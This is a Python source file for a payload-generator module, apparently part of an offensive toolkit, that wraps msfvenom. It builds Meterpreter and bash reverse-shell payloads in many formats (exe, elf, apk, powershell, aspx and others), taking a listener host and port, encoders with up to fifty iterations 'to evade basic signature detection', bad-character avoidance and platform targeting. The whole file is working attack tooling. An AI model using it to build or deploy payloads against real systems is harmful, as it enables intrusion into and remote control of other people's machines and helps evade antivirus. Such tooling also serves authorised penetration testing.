#!/usr/bin/env python3
"""
Payload Generator Module — msfvenom wrapper.

Generates shellcode, executables, and other payloads using msfvenom.
Supports all payload formats (exe, elf, raw, python, powershell, etc.),
encoding to evade basic signature detection, and architecture/platform
targeting for cross-platform payload generation.

Does NOT require root privileges. Payloads are written to the filesystem.
"""

import argparse
import re
from pathlib import Path
from typing import Any

from base_module import TacticalModule


# Common payload presets for documentation purposes
_COMMON_PAYLOADS = {
    "linux/x86/meterpreter/reverse_tcp",
    "linux/x64/meterpreter/reverse_tcp",
    "windows/x64/meterpreter/reverse_tcp",
    "windows/meterpreter/reverse_tcp",
    "osx/x64/meterpreter/reverse_tcp",
    "android/meterpreter/reverse_tcp",
    "cmd/unix/reverse_bash",
    "python/meterpreter/reverse_tcp",
}

_COMMON_FORMATS = {
    "exe", "elf", "raw", "python", "ruby", "bash", "sh",
    "powershell", "psh", "asp", "aspx", "jsp", "war", "dll",
    "macho", "apk", "jar", "c", "csharp", "hex",
}


class PayloadGenerator(TacticalModule):
    """Generate attack payloads using msfvenom."""

    name: str = "payload_generator"
    description: str = (
        "Generate Metasploit payloads (shellcode, executables, scripts) via msfvenom. "
        "Supports all platforms, formats, encoders, and architectures."
    )

    def _add_module_args(self) -> None:
        """Register payload generation arguments."""
        self.parser.add_argument(
            "--payload",
            required=True,
            help=(
                "Metasploit payload path "
                "(e.g. linux/x64/meterpreter/reverse_tcp, windows/x64/shell/reverse_tcp)"
            ),
        )
        self.parser.add_argument(
            "--lhost",
            default="",
            help="Local host for reverse connections (listener IP)",
        )
        self.parser.add_argument(
            "--lport",
            type=int,
            default=4444,
            help="Local port for reverse connections (default: 4444)",
        )
        self.parser.add_argument(
            "--format",
            default="raw",
            help=(
                "Output format: exe, elf, raw, python, powershell, bash, c, etc. "
                "(default: raw)"
            ),
        )
        self.parser.add_argument(
            "--output-file",
            required=True,
            help="Path to write the generated payload",
        )
        self.parser.add_argument(
            "--encoder",
            default="",
            help="Encoder module (e.g. x86/shikata_ga_nai, x64/xor_dynamic)",
        )
        self.parser.add_argument(
            "--iterations",
            type=int,
            default=1,
            help="Number of encoding iterations (default: 1, max: 50)",
        )
        self.parser.add_argument(
            "--platform",
            default="",
            help="Target platform override (e.g. windows, linux, osx, android)",
        )
        self.parser.add_argument(
            "--arch",
            default="",
            help="Target architecture override (e.g. x86, x64, arm, aarch64)",
        )
        self.parser.add_argument(
            "--bad-chars",
            default="",
            help="Characters to avoid in payload (e.g. '\\x00\\x0a\\x0d')",
        )
        self.parser.add_argument(
            "--smallest",
            action="store_true",
            default=False,
            help="Generate smallest possible payload (no encoder, minimal options)",
        )

    # ── Validation ───────────────────────────────────────────────────

    def _validate_args(self, args: argparse.Namespace) -> None:
        """Validate arguments before running msfvenom."""
        # Payload path format: category/platform/architecture/name
        if not re.match(r"^[a-zA-Z0-9_/.-]+$", args.payload):
            self.output_error(
                f"Invalid payload path: {args.payload!r}. "
                "Only alphanumeric characters, slashes, dots, and underscores allowed."
            )

        # LHOST validation for reverse payloads
        if "reverse" in args.payload.lower() and not args.lhost:
            self.output_error(
                f"Payload {args.payload!r} appears to be a reverse payload — "
                "--lhost is required."
            )

        if args.lhost and not self.validate_ip(args.lhost):
            self.output_error(f"Invalid LHOST IP address: {args.lhost!r}")

        if not self.validate_port(args.lport):
            self.output_error(f"Invalid LPORT: {args.lport}. Must be 1–65535.")

        if args.iterations < 1 or args.iterations > 50:
            self.output_error(
                f"--iterations must be 1–50, got {args.iterations}."
            )

        # Output file validation
        output_path = Path(args.output_file)
        if not output_path.parent.exists():
            self.output_error(
                f"Output directory does not exist: {output_path.parent}"
            )

        if output_path.exists():
            self.logger.warning(
                "Output file already exists and will be overwritten: %s",
                args.output_file,
            )

        # Encoder format validation
        if args.encoder and not re.match(r"^[a-zA-Z0-9_/.-]+$", args.encoder):
            self.output_error(
                f"Invalid encoder name: {args.encoder!r}. "
                "Only alphanumeric, slashes, dots, and underscores allowed."
            )

    # ── Command builder ──────────────────────────────────────────────

    def _build_msfvenom_args(self, args: argparse.Namespace) -> list[str]:
        """Build msfvenom argument list from parsed args."""
        msfv_args: list[str] = [
            "-p", args.payload,
            "-f", args.format,
            "-o", args.output_file,
        ]

        # Payload options
        if args.lhost:
            msfv_args.extend(["LHOST=" + args.lhost])
        if args.lport:
            msfv_args.extend(["LPORT=" + str(args.lport)])

        # Platform and architecture
        if args.platform:
            msfv_args.extend(["--platform", args.platform])
        if args.arch:
            msfv_args.extend(["-a", args.arch])

        # Encoding
        if args.encoder and not args.smallest:
            msfv_args.extend(["-e", args.encoder, "-i", str(args.iterations)])

        # Bad character avoidance
        if args.bad_chars:
            msfv_args.extend(["-b", args.bad_chars])

        # Smallest payload
        if args.smallest:
            msfv_args.append("--smallest")

        return msfv_args

    # ── Output parsing ───────────────────────────────────────────────

    def _parse_msfvenom_output(self, stdout: str, stderr: str) -> dict[str, Any]:
        """
        Parse msfvenom status output.

        msfvenom prints progress to stderr:
            [-] No platform was selected, choosing Msf::Module::Platform::Linux...
            [-] No arch selected, selecting arch: x64 from the payload...
            No encoder specified, outputting raw payload
            Payload size: 177 bytes
            Saved as: /path/to/output.bin
        """
        combined = stderr + "\n" + stdout
        result: dict[str, Any] = {
            "payload_size_bytes": 0,
            "encoder_used": "",
            "platform_detected": "",
            "arch_detected": "",
            "warnings": [],
            "errors": [],
        }

        # Payload size
        size_match = re.search(r"Payload size:\s*(\d+)\s*bytes", combined, re.IGNORECASE)
        if size_match:
            result["payload_size_bytes"] = int(size_match.group(1))

        # Encoder selected
        enc_match = re.search(r"Found (\d+) compatible encoders.*?using (.+)", combined, re.IGNORECASE)
        if enc_match:
            result["encoder_used"] = enc_match.group(2).strip()
        else:
            enc_match2 = re.search(r"Encoded with (.+?) using", combined, re.IGNORECASE)
            if enc_match2:
                result["encoder_used"] = enc_match2.group(1).strip()

        # Auto-detected platform
        plat_match = re.search(r"choosing Msf::Module::Platform::(\w+)", combined, re.IGNORECASE)
        if plat_match:
            result["platform_detected"] = plat_match.group(1)

        # Auto-detected architecture
        arch_match = re.search(r"selecting arch:\s*(\w+)", combined, re.IGNORECASE)
        if arch_match:
            result["arch_detected"] = arch_match.group(1)

        # Warnings and errors
        for line in combined.splitlines():
            line = line.strip()
            if line.startswith("[-]") and "error" in line.lower():
                result["errors"].append(line[3:].strip())
            elif line.startswith("[!]"):
                result["warnings"].append(line[3:].strip())

        return result

    def _get_file_metadata(self, output_file: str) -> dict[str, Any]:
        """Collect metadata about the generated payload file."""
        path = Path(output_file)
        if not path.exists():
            return {"exists": False}

        stat = path.stat()
        return {
            "exists": True,
            "size_bytes": stat.st_size,
            "permissions": oct(stat.st_mode & 0o777),
        }

    # ── Main run ─────────────────────────────────────────────────────

    def run(self, args: argparse.Namespace) -> None:
        """Execute msfvenom payload generation and return file metadata."""
        self._validate_args(args)

        msfvenom_args = self._build_msfvenom_args(args)
        self.logger.info(
            "Generating payload: %s -> %s (format=%s)",
            args.payload,
            args.output_file,
            args.format,
        )

        result = self.run_tool("msfvenom", msfvenom_args, timeout=args.timeout)

        if result.returncode != 0:
            self.output_error(
                "msfvenom failed to generate payload.",
                {
                    "exit_code": result.returncode,
                    "stderr": result.stderr[:1000],
                    "payload": args.payload,
                    "format": args.format,
                },
            )

        parsed = self._parse_msfvenom_output(result.stdout, result.stderr)
        file_meta = self._get_file_metadata(args.output_file)

        self.output_success({
            "payload": args.payload,
            "format": args.format,
            "output_file": args.output_file,
            "lhost": args.lhost or "(none)",
            "lport": args.lport,
            "encoder": args.encoder or "(none)",
            "iterations": args.iterations,
            "platform": args.platform or "(auto)",
            "arch": args.arch or "(auto)",
            "file_metadata": file_meta,
            **parsed,
        })


if __name__ == "__main__":
    PayloadGenerator().execute()
